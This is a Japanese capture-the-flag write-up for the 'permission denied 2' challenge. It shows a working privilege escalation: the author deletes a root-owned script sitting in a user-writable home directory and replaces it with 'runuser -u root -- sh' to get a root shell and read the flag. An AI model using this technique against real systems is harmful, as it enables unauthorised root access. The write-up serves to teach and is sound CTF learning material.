# permission denied 2

## / Overview

ホームディレクトリのパーミッション

## / Writeup

ユーザー`alpaca`としてシェルが与えられます．また，カレントディレクトリは`alpaca`のホームディレクトリです．

```sh
$ nc 34.170.146.252 24312
$ id
uid=1000(alpaca) gid=1000(alpaca) groups=1000(alpaca)
$ pwd
/home/alpaca
```

ホームディレクトリには`flag.txt`と`chal.sh`, その他の隠しファイルが含まれています．

```sh
$ ls -la
total 32
drwx------ 1 alpaca alpaca 4096 Apr 30 12:21 .
drwxr-xr-x 1 root   root   4096 Apr 23 02:47 ..
-rw-r--r-- 1 alpaca alpaca  220 Mar  8 15:21 .bash_logout
-rw-r--r-- 1 alpaca alpaca 3526 Mar  8 15:21 .bashrc
-rw-r--r-- 1 alpaca alpaca  807 Mar  8 15:21 .profile
-r-------- 1 root   root    127 Apr 23 02:38 chal.sh
-r-------- 1 root   root     49 Apr 30 12:21 flag.txt
```

`flag.txt`は`root`しか読み取りの権限がないのでそのままでは中身が見れません．

最初に考えたのは`.bashrc`や`.profile`を使った権限変更です．これらのファイルは，シェルを呼び出したときや初回ログイン時に自動で実行されるコマンドを記述するためのファイルなので，ここに`chmod +r flag.txt`とかを書き込んでおけば，次にログインした時に`flag.txt`が読めるのではと思いました．

しかし，そもそもこれらのファイルの権限が`alpaca`であるので`root`所有のファイルの操作は出来ないことが判明しました．

次に`chal.sh`がホームディレクトリに存在することを利用して`chal.sh`を一旦削除してから作り直す方法を試します．

`/home/alpaca`は現在のユーザである`alpaca`が所有者なので，書き込み権限（内部のファイルを削除したり新規に作成する権限）があります．

```sh
$ ls -la ../
total 16
drwxr-xr-x 1 root   root   4096 Apr 23 02:47 .
drwxr-xr-x 1 root   root   4096 Apr 30 12:20 ..
drwx------ 1 alpaca alpaca 4096 Apr 30 12:21 alpaca
```

つまり`chal.sh`を書き換えることは出来なくても，一度消して新たなファイルとして作り直すことが可能です．これを用いて`chal.sh`の中身を**rootユーザでシェルを起動する**構成にしましょう．

```sh
$ rm -f chal.sh
$ echo "runuser -u root -- sh" > chal.sh
```

`Dockerfile`を見ると，サーバに接続する時に`bash chal.sh`が実行される事が分かるので，次回接続時は`root`としてログインできます．

ここで一つ注意しなければならないのが，元の`chal.sh`の最後の行に`rm flag.txt`が書かれているということです．一度接続を切ってから再接続するとフラグは跡形もなく消え去ってしまいます．元の接続は切らず，別のシェルからログインして`cat flag.txt`を実行してください．